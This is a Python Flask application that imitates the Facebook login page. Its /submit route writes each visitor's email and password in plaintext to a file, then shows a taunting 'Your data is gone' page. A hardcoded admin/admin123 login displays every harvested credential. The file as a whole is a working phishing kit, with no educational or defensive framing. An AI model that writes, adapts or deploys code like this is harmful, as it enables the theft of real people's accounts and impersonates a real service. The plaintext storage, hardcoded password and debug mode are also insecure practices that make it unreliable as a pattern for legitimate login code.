from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

# Your login page HTML with your styles & form
form_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      margin: 0;
      background-color: #f0f2f5;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .admin-link {
      position: fixed;
      top: 10px;
      right: 10px;
      font-weight: bold;
      color: #1877f2;
      text-decoration: none;
    }
    .container {
      max-width: 900px;
      margin: 60px auto;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .left h1 {
      font-size: 56px;
      color: #1877f2;
      margin-bottom: 20px;
    }
    .left p {
      font-size: 24px;
    }
    .form-box {
      background: #fff;
      padding: 20px 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 320px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #155ecb;
    }
    .footer {
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <a class="admin-link" href="/admin_login">Admin Login</a>
  <div class="container">
    <div class="left">
      <h1>facebook</h1>
      <p>Connect with friends and the world around you on Facebook.</p>
    </div>
    <div class="form-box">
      <form method="POST" action="/submit">
        <input type="text" name="email" placeholder="Email or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
      <div class="footer">
        <p><a href="forget.html">Forgotten password?</a></p>
        <p><a href="#">Create new account</a></p>
      </div>
    </div>
  </div>
</body>
</html>
'''

# Your thank you page HTML exactly as you gave
thankyou_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Thank You - Facebook</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .thank-you-box {
      background-color: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
      text-align: center;
    }
    .thank-you-box h1 {
      color: #1877f2;
    }
    .thank-you-box p {
      font-size: 18px;
      margin-top: 10px;
      color: #333;
    }
    .evil {
      font-size: 20px;
      color: red;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="thank-you-box">
    <h1>Thank You for Logging In!</h1>
    <p>Welcome to Facebook. We appreciate your trust.</p>
    <p class="evil">Your data is gone... <strong>hehehe 😈</strong></p>
  </div>
</body>
</html>
'''

# Simple admin login page HTML
admin_login_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Admin Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .admin-form {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      width: 300px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 12px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #1877f2;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #155ecb;
    }
  </style>
</head>
<body>
  <div class="admin-form">
    <h2>Admin Login</h2>
    <form method="POST" action="/admin_login">
      <input type="text" name="admin_user" placeholder="Username" required>
      <input type="password" name="admin_pass" placeholder="Password" required>
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
'''

@app.route('/', methods=['GET'])
def index():
    return render_template_string(form_html)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    with open('userdata.txt', 'a') as f:
        f.write(f'Email: {email}, Password: {password}\n')
    return redirect(url_for('thankyou'))

@app.route('/thankyou')
def thankyou():
    return render_template_string(thankyou_html)

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('admin_user')
        password = request.form.get('admin_pass')
        # Simple admin check; change credentials as needed
        if username == 'admin' and password == 'admin123':
            with open('userdata.txt', 'r') as f:
                data = f.read()
            return f'''
                <h2>Welcome Admin! Here is the saved data:</h2>
                <pre>{data}</pre>
                <a href="/admin_login">Back to Admin Login</a>
            '''
        else:
            return '''
                <h3>Invalid credentials</h3>
                <a href="/admin_login">Try again</a>
            '''
    return render_template_string(admin_login_html)

if __name__ == '__main__':
    app.run(debug=True)